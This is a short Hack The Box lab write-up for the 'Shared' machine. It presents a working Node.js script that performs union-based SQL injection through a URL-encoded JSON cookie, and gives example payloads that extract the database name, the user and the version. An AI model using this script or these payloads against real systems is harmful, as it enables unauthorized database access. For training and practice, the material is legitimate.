# Hack The Box. Machines. Shared

Machine write-up: https://7rocky.github.io/en/htb/shared

### `sqli.js`

This script built in Node.js is used to exploit a Union-based SQLi. The injection comes into place in a cookie called `custom_cart`, where we have a JSON document that is URL encoded.

This is the main function (`sqli`):

```js
const sqli = payload => {
	payload = encodeURIComponent(JSON.stringify({ [payload]: 1 }))

	const headers = {
		Cookie: `custom_cart=${payload}`,
		Host: 'checkout.shared.htb'
	}

	const req = https.request({...options, headers}, res => {
		let body = ''

  	    res.on('data', data => (body += data))
  	    res.on('end', () => console.log(parseBody(body)))
	})

	req.on('error', console.error)
	req.end()
}
```

The response body is parsed using a regular expression:

```js
const parseBody = body => body.match(/<td>([\s\S]*?)<\/td>/)[1]
```

To use the script, we need to add the SQLi payload as a command line argument:

```js
if (process.argv.length !== 3) {
	console.error('Usage: node sqli.js "<sqli-payload>"')
	process.exit(1)
}

sqli(process.argv[2])
```

This is an example of usage:

```console
$ node sqli.js "' union select 1,database(),3-- -"  
checkout

$ node sqli.js "' union select 1,user(),3-- -"
checkout@localhost

$ node sqli.js "' union select 1,version(),3-- -"
10.5.15-MariaDB-0+deb11u1
```
